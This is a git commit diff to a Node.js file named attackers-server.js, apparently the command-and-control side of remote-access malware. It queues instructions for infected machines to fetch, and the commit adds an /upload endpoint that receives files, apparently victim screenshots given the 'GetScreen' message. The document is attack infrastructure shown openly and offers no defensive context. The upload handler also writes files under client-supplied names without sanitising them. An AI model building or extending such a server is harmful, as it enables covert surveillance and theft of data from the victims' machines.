e0a0b0199226a68abc12d4452f2889ce7c30a1e7
benielcapo <169079689+benielcapo@users.noreply.github.com>
2025-03-09 17:05:15 -0300

    Added GetScreen (requires multiparty)

--- attackers-server.js
+++ attackers-server.js
@@ -1,4 +1,7 @@
 const http = require("http")
+const path = require("path")
+const fs = require("fs")
+const multiparty = require("multiparty")
 
 var instructions = []
 
@@ -16,23 +19,44 @@ function GetInstructions() {
 
 http.createServer(function(req, res) {
     if (req.method == "POST") {
-        let body = ""
-        req.on("data", function(chunk) {
-            body += chunk
-        })
-        req.on("end", function() {
-            console.log("received data is")
-            console.log(body)
-            body = JSON.parse(body)
-            for (const key in body) {
-                const instruction = body[key]
-                if (instruction) {
-                    instructions.push(instruction)
+        if (req.url == "/upload") {
+            const form = new multiparty.Form()
+            form.parse(req, (err, fields, files) => {
+                if (err) {
+                    console.log("error parsing form: " + err)
+                    res.end("Error while uploading files")
+                    return
                 }
-            }
-            console.log(instructions)
-            res.end("Received data")
-        })
+                const uploadedFile = files.file[0]
+                const uploadPath = path.join(__dirname, uploadedFile.originalFilename)
+                fs.copyFile(uploadedFile.path, uploadPath, (copyErr) => {
+                    if (copyErr) {
+                        console.log("error copying to path: " + copyErr)
+                        res.end("Error copying to file")
+                        return
+                    }
+                    res.end("Good")
+                })
+            })
+        } else {
+            let body = ""
+            req.on("data", function(chunk) {
+                body += chunk
+            })
+            req.on("end", function() {
+                console.log("received data is")
+                console.log(body)
+                body = JSON.parse(body)
+                for (const key in body) {
+                    const instruction = body[key]
+                    if (instruction) {
+                        instructions.push(instruction)
+                    }
+                }
+                console.log(instructions)
+                res.end("Received data")
+            })
+        }
     } else if (req.method == "GET") {
         res.end(GetInstructions())
     } else {
